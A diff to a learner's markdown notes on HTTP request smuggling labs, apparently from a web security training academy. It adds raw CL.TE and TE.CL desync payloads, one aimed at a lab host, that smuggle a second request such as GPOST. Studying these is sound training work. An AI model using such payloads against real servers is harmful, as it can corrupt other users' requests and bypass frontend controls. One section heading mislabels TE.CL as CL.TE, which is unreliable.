@@ -69,6 +69,7 @@ SMUGGLED
 
 #### Lab: HTTP Request Smuggling, Basic CL.TE Vulnerability
 - Involves a frontend and backend, and the frontend does not support chunked encoding. The frontend server rejects requests that aren't using GET or POST method. To solve, smuggle a request to the back-end server so that the next request processed by the backend server appears to use the method `GPOST`. 
+- So in this case, the frontend server uses the `Content-Length` header and the backend server uses `Transfer-Encoding`. We are saying the content does not include that extra stuff after the 0 ... 
 
 ```
 POST /post/comment HTTP/1.1
@@ -95,3 +96,39 @@ G
 ```
 
 ![alt text](Photos/image.png)
+
+### CL.TE Vulnerabilities
+- So, here, the frontend is using the `Transfer-Encoding` header and the backend server is using the `Content-Length` header. Perform simple HTTP request smugging with the following: 
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+#### Lab: HTTP Request Smugging, Basic TE.CL Vulnerability
+- I had trouble making this work manually through Burp Repeater; I solved the lab using their Smuggler extension. 
+
+```
+POST / HTTP/2
+Host: 0aef000d03ef0a09810d4d8100cb00e8.web-security-academy.net
+Test-Header: 18
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
